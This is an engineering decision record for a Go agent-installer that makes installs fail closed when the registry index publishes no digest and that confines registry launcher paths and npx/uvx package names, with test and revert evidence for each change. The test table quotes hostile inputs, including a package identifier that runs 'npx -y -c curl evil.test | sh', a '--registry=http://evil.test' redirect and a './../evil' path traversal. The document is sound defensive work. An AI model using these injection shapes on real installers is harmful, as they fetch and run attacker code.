# Agent installs fail closed without a published digest, and the registry command is contained

Date observed: 2026-09-23

## Decision

Accepted. G5 (a binary install proceeded without integrity verification when the
index published no digest) and G6 (the registry index supplied the executable
path that was launched) from
`docs/governance/security_threat_model_2026-09-23.md:236-266` were classified as
decisions rather than defects. Both decisions are taken here in the
safe-by-default direction, with the operator opt-in the G5 recommendation asked
for.

## What the code did before

| Fact | Where |
| --- | --- |
| The installer queries the registry index (fresh, not the cache) | `internal/logic/agentmgr/registry_client.go:97,140-146,180-186` |
| `sha256` is an optional field: "Empty means the index publishes the distribution without a digest" | `internal/logic/agentmgr/registry_client.go:62-67` |
| An empty digest only changed the evidence: progress line, `status=digest_not_published`, `return evidence, nil` | `internal/logic/agentmgr/artifact_integrity.go:46-50` |
| Extraction happened after that gate, so a digest-less artifact was extracted unchecked | `internal/logic/agentmgr/installer.go:189-217` (`:203` gate, `:208-214` extract) |
| The launched command was `dist.Cmd`, joined to the agent directory only when `filepath.IsLocal(cmd)` **or** `cmd` started with `"./"`; anything else was used verbatim | `internal/logic/agentmgr/installer.go:178-183` |
| That `\|\|` shortcut defeats `IsLocal`'s guarantee: `./../evil` is not local, but it starts with `./`, so it was joined and escaped to the parent directory. An absolute `cmd` such as `/bin/sh` was used as-is | same, and `internal/logic/agentmgr/installer.go:135-138` registers the result |
| npx/uvx package identifiers became argv unchanged (`npx -y <pkg>`, `uvx <pkg>`) | `internal/logic/agentmgr/registry_client.go:220-253` |
| A binary artifact is downloaded by Matrix itself with a plain HTTP GET: no hash, no signature, no package manager in the path | `internal/providers/network/tcp_provider.go:49-63,65-71` |

Two questions the task asked, answered with evidence:

- **Does anything lower verify a binary artifact?** No. Matrix downloads the
  archive over TLS and the only integrity control is the digest comparison.
  For the npx/uvx distributions there is no Matrix download at all
  (`artifact_integrity.go:68-73` records `not_applicable`), and npm/uv do verify
  the tarballs they fetch against their own registry metadata — but that is a
  different trust anchor (npm/PyPI, not the ACP index) and a different path, so
  it does not make a digest-less *binary* install safe.
- **Would failing closed break installs that are safe today?** It refuses the
  digest-less binary entries, and the live index has them: of 100 binary
  platform entries, 47 publish no `sha256` (9 of 23 agents:
  `antigravity-acp`, `cortex-code`, `corust-agent`, `crow-cli`, `cursor`,
  `devin`, `junie`, `stakpak`, `vtcode`; checked against
  `https://cdn.agentclientprotocol.com/registry/v1/latest/registry.json` on
  2026-09-23). Those installs were *not* safe: nothing verified them. None of
  the nine offers a verifiable npx/uvx alternative, so no install silently
  loses a fallback either. The default agent `opencode` publishes a digest for
  every platform.

## What changed

- A digest-less binary artifact is refused by default. The refusal names the
  agent, the artifact URL and the platform, says the index publishes no
  `sha256`, says it is refusing, and names the opt-in:
  `internal/logic/agentmgr/artifact_integrity.go:50-53`.
- The documented opt-in is `matrix install <agent-id> --allow-unverified`
  (`cmd/matrix/install.go:64,80`), stored on the installer with
  `Installer.SetAllowUnverified` (`internal/logic/agentmgr/installer.go:38-48`).
  When it is used the install prints
  `WARNING: --allow-unverified is in effect: installing <agent> without
  integrity verification because the registry index publishes no sha256 for
  <artifact> (<platform>)` (`artifact_integrity.go:55`), emits the structured
  `install_allow_unverified` warning (`:56`), and records
  `artifact_verification.override = "allow-unverified"` (`:54`,
  `internal/logic/agentcfg/meta.go:32-37,42-56`). The status stays
  `digest_not_published` and `verified` stays false, so
  `matrix agent doctor <agent-id>` and
  `matrix agent info <agent-id> --source=local` keep reporting it as not
  verified. The opt-in does not cover a mismatched or malformed digest.
- The registry `cmd` is constrained before the download:
  `agentinstall.ResolveLauncherPath` (`internal/logic/agentinstall/registry_input.go:52-91`,
  called from `internal/logic/agentmgr/installer.go:189`) rejects an empty
  value, surrounding whitespace, over-long values, absolute paths, Windows
  volume/device names, anything containing `..` after cleaning, and any
  character outside `[A-Za-z0-9._+/\-]`, then proves with `filepath.Rel` that the
  result is a descendant of the agent directory. After extraction the file must
  exist and not be a directory (`installer.go:198,205-217`).
- The npx/uvx package identifier is validated at the point it becomes argv
  (`agentinstall.ValidatePackageSpec`, `registry_input.go:37-43,98-119`, called from
  `registry_client.go:233,247`): it must be an npm spec (`@scope/name@version`)
  or a uv requirement (`name[extras]==version`), over a bounded length. A value
  that starts with `-` is refused outright, because npx/uvx parse their own
  options anywhere on the command line: `npx -y -c '<command>'` would have run
  an arbitrary shell command.
- Documented in `docs/wiki/Using-Agents.md` (Installing Agents) and
  `docs/wiki/CLI-Reference.md` (`matrix install`).

## Evidence: tests and the revert that fails them

Every claim was checked by reverting the change and watching the named test
fail, then restoring and re-running it green. `internal/logic/agentmgr` and
`internal/logic/agentinstall` unless stated.

| Test | Reverted change | Observed failure |
| --- | --- | --- |
| `TestInstallRefusesArtifactWithoutPublishedDigest` | the `if !inst.allowUnverified` guard in `artifact_integrity.go` | `an artifact whose registry entry publishes no digest must refuse the installation by default` |
| `TestInstallAllowUnverifiedOptsIntoAnArtifactWithoutPublishedDigest` | `SetAllowUnverified` made a no-op | `--allow-unverified must let the install proceed, got artifact integrity check failed ...` |
| same | the `progressf` warning line | `the override must be visible with "--allow-unverified", got: <empty>` |
| same | `evidence.Override = ...` | `override = "", want "allow-unverified"` |
| `TestInstallRefusesRegistryCommandThatEscapesTheAgentDirectory` | old `filepath.IsLocal(cmd) \|\| strings.HasPrefix(cmd, "./")` resolution | `/bin/sh` and `/usr/bin/env` installed (registered outside the agent directory); traversals refused only by the later existence check, not by containment |
| `TestInstallRefusesRegistryCommandWithShellMetacharacters` | same | each metacharacter command installed |
| `TestInstallRefusesRegistryCommandMissingFromTheArchive` | the `requireExtractedLauncher` call | `a registry cmd that the archive does not contain must refuse the install` |
| `TestInstallRefusesRegistryCommandPointingAtADirectory` | same | `a registry cmd that resolves to a directory must refuse the install` |
| `TestResolveAnyDistributionRejectsOptionShapedPackageIdentifiers` | the two `ValidatePackageSpec` calls | hostile identifiers resolved to `npx -y -c curl evil.test \| sh`, `npx -y --registry=http://evil.test`, `uvx --from evil` |
| `TestInstallAllowUnverifiedIsAnExplicitOffByDefaultOptIn`, `TestInstallAllowUnverifiedParsesIntoTheCommandVariable` (cmd/matrix) | the `BoolVar` registration | `matrix install must expose --allow-unverified`; `parsing --allow-unverified failed: unknown flag` |
| `TestArtifactVerificationOverrideIsRecordedAndNeverVerified` (agentcfg) | `Override` field / `Describe` case | override missing from the stored evidence / from the printed line |

Compatibility is pinned by tests that must keep passing:
`TestValidateLauncherPathAcceptsEveryLiveRegistryShape`,
`TestValidatePackageSpecAcceptsEveryLiveRegistryPackage`,
`TestResolveLauncherPathKeepsEveryAcceptedPathInsideTheAgentDirectory`,
`TestInstallAcceptsLegitimateRegistryCommandShapes` (6 shapes from the live
index, including `bin/kimi` and a `+`-containing version directory) and
`TestResolveAnyDistributionKeepsLivePackageIdentifiersWorkable` (the exact argv
for a live npx and a live uvx entry).

The old test `TestInstallProceedsWhenDigestIsNotPublishedButStaysDistinguishable`
asserted the opposite default; it was replaced (not deleted silently) by
`TestInstallRefusesArtifactWithoutPublishedDigest` and
`TestInstallAllowUnverifiedOptsIntoAnArtifactWithoutPublishedDigest`, which
keeps every evidence assertion of the old test under the opt-in.

## What this does NOT protect against

- **npx/uvx arguments and environment from the index are still unconstrained**
  (`registry_client.go:236-239,250-253`). With a valid, pinned package name an
  entry can still pass npm/uv flags that change where the package comes from
  (for example `--registry=...`) and can still set the child environment
  (`npx.Env` becomes the agent's env). That is G7 and needs the pinning/allowlist
  treatment the threat model recommends, not a command-shape check.
- **The digest covers the archive, not the extracted executable**, unchanged:
  a published digest describes the tarball, so it covers the installed file
  transitively but cannot be re-checked later.
- **A compromised registry that publishes a digest still wins**: the digest is
  fetched from the same index as the artifact URL. The gate detects tampering
  between the index and the CDN/artifact, not a fully compromised publication
  path.
- **`matrix doctor`'s warning text is unchanged** (it still says "publishes no
  sha256"); the override is visible in the JSON `artifact_verification` and in
  `agent info`'s `Integrity:` line. Editing the doctor text would exceed the
  `cmd/matrix` production-LOC budget (see below).
- **A launcher refusal that happens after extraction leaves the extracted files
  in place** (the agent is not registered and no evidence is recorded). The
  refusal cases that matter — traversal, absolute path, metacharacters — happen
  before the download and leave nothing; the post-extraction cases can only be
  reached by an artifact whose digest already matched or that the operator
  explicitly accepted with `--allow-unverified`.

## Gates

- `gofmt -l` on touched files: empty. `golangci-lint run` on the four touched
  packages: `0 issues`.
- `go test -count=1` on `internal/logic/agentmgr`, `internal/logic/agentinstall`,
  `internal/logic/agentcfg`, `cmd/matrix`: all pass.
- `go run ./scripts/governance_check --manifest governance/manifest.toml`:
  `GOVERNANCE_CHECK_OK`.
- `go run ./scripts/code_governance.go --config code-governance.toml` reports,
  verbatim: `- package budget exceeded: internal/logic/agentmgr has 1081 LOC
  (budget 1055)`. The package had 1053 LOC and 2 lines of headroom before this
  change, so no fail-closed implementation fits inside the current override;
  the budget file was deliberately not edited. Raising the dated
  `internal/logic/agentmgr` override to at least 1081 (or splitting the package)
  is the owner's call. `cmd/matrix` is exactly at its 3245 override.
